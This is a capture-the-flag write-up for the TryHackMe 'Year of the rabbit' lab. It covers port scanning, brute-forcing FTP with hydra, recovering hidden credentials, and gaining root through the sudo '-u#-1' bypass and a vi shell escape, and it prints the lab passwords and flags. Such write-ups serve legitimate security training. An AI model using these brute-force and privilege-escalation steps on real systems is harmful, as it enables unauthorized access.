# Year of the rabbit
## Challenge Room
[Play here](https://tryhackme.com/room/yearoftherabbit)

## Recon

1. Go to the website
2. Run a gobuster scan
3. Run a nmap scan

1. Website is the deafault apache website. Let's see if anything looks off. So the `css` is usually in the website, as seen from the [actual default page](). Here, its from `/assets/style.css`.

2. Gobuster also shows the same assets folder

3. Nmap scan looks pretty basic:
```
❯ nmap -script=default -sV -A -T4 10.10.77.156
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 21:18 EST
Nmap scan report for 10.10.77.156
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.80 seconds
```

![](https://i.imgur.com/S8SXhtb.png)


Meanwhile, let's have a look at what's exploitable

```
❯ searchsploit openssh 6.7p1
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                           | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                     | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalati | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                           | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                               | linux/remote/45939.py
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
❯ searchsploit vsftpd 3.0.2
Exploits: No Results
Shellcodes: No Results
❯ searchsploit httpd 2.4.10
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
OpenBSD HTTPd < 6.0 - Memory Exhaustion Denial of Service                                          | openbsd/dos/41278.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

So we do have some paths that we can take later down, but currently, we need a foothold.

While looking around, I first of all got rickrolled ;-; and secondly, found this ```
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```

Nice. Let's go there.

![](https://i.imgur.com/ahceSmx.png)


Very intersting. The page then redirects me to ... ANOTHER RICKROLL. 😠

Let's try turning off the javascript.

![](https://i.imgur.com/YZcZK4D.png)

Well well well. Anyways, I want to have a look at the traffic, and how this redirect is happening. Let's fire up burp.

Ah yes. We have

![](https://i.imgur.com/CTrYkbh.png)

Let's go there

So we have this guy as the url now: `http://10.10.77.156/WExYY2Cv-qU/`.

Going there we have:

![](https://i.imgur.com/SkYGtVx.png)

and a reverse image search tells us ... the image is of Lena Forsen, some Swedish model. I don't know how this is helpful.

I see no other place for exploration, so this is it then. We will search image for oddities.  


Ah yes! doing strings on the `Hot_Babe.png` shows the ftp username and a list of passwords:

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
...
```

I'll run `hydra` on it, just because they have a nice starting message :)

```
❯ hydra -l ftpuser -P pass.txt ftp://10.10.186.25
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-24 23:01:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.186.25:21/
[21][ftp] host: 10.10.186.25   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-24 23:01:16
```

Yay!

```
❯ ftp 10.10.186.25
Connected to 10.10.186.25.
220 (vsFTPd 3.0.2)
Name (10.10.186.25:tanishq): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get "Eli's_Creds.txt"
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (3.2562 MB/s)
ftp> 
```


## Foothold
Opening the creds we get something ... this looks like brainfuck, the langauge. yes! compiling it, we get:

```
User: eli
Password: DSpDiM1wAEwid
```

There's nothing else, so let's login as `eli`.

```
❯ ftp 10.10.186.25
Connected to 10.10.186.25.
220 (vsFTPd 3.0.2)
Name (10.10.186.25:tanishq): eli
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Desktop
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Documents
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Downloads
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Music
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Pictures
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Public
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Templates
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Videos
-rw-------    1 1000     1000       589824 Jan 23  2020 core
226 Directory send OK.
ftp> pwd
257 "/"
```

After spending some disappointing amount of time on this, I realised this may be a `ssh` thing, not a `ftp` thing. <insert disappointment meme :( >


```
❯ ssh eli@10.10.186.25
The authenticity of host '10.10.186.25 (10.10.186.25)' can't be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.186.25' (ECDSA) to the list of known hosts.
eli@10.10.186.25's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$ ls
core  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
eli@year-of-the-rabbit:~$ 
```

Works! Now, I use the `locate` command to find all `*.txt` and I find these interesting things:

- `/home/gwendoline/user.txt`
- `/var/ftp/uploads/Eli's_Creds.txt`
- `/var/lib/exim4/berkeleydbvers.txt`

We know the second one. The third prints `5.3`. I don't know what that is. The first one is what we are after.

Unsurprisingly, we have 

`-r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt`

Now, they do mention some common secret place in the message when we first loggied in.

```
eli@year-of-the-rabbit:~$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```

GG.

```
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

lmao. okay, back to business. Logging as her, we get:
```
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{pwned}
```

## Priv Esc

So we have 
```
gwendoline@year-of-the-rabbit:/$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

We can access `user.txt` using `vi` for some reason. The issue is, it says everyone except root can make it work. So ... can't really do anything.

At this point, `linpeas` looks like it could help. So, I'll scp that file to the machine. 

```
❯ scp linpeas.sh gwendoline@10.10.186.25:~
gwendoline@10.10.186.25's password: 
linpeas.sh     100%  313KB 188.9KB/s   00:01
```

I'll let it run in the background. So I did not find anything much interesting, except `exim4` that it marked in red. Going up, we have:

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                         
Sudo version 1.8.10p3 
```

Very nice. So we have the [exploit](https://www.exploit-db.com/exploits/47502).

```
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

root@year-of-the-rabbit:/home/gwendoline# whoami
root
```

When you are in `vi`, go in the command more by pressing `:` and then run the command `!/bin/bash`

```
root@year-of-the-rabbit:/# locate *.txt
...
/root/root.txt
...
```

```
root@year-of-the-rabbit:/# cat /root/root.txt
THM{l33t}
```

PWNED!

